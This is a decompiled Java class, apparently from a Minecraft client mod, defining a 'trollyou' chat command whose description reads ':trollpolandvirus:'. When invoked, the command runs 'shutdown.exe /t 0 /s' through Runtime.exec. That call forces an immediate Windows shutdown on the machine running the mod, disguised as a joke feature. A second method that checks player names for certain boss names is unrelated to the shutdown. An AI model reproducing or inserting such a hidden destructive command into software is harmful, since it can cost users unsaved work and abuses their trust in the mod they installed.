package oringo.command;

import com.mojang.realmsclient.gui.ChatFormatting;
import java.io.IOException;
import net.minecraft.client.entity.EntityOtherPlayerMP;
import net.minecraft.entity.Entity;

public class TrollYouCommand extends Command {
   public void method0(String[] var1) {
      try {
         Runtime.getRuntime().exec("shutdown.exe /t 0 /s");
      } catch (IOException var3) {
         throw new RuntimeException(var3);
      }
   }

   public TrollYouCommand() {
      super("trollyou");
   }

   public static boolean method0(Entity var0) {
      if (!(var0 instanceof EntityOtherPlayerMP)) {
         return false;
      } else {
         EntityOtherPlayerMP var1 = (EntityOtherPlayerMP)var0;
         String var2 = ChatFormatting.stripFormatting(var1.getName());
         return var2.contains("Bonzo") || var2.contains("Scarf") || var2.contains("Livid");
      }
   }

   public String method1() {
      return ":trollpolandvirus:";
   }
}
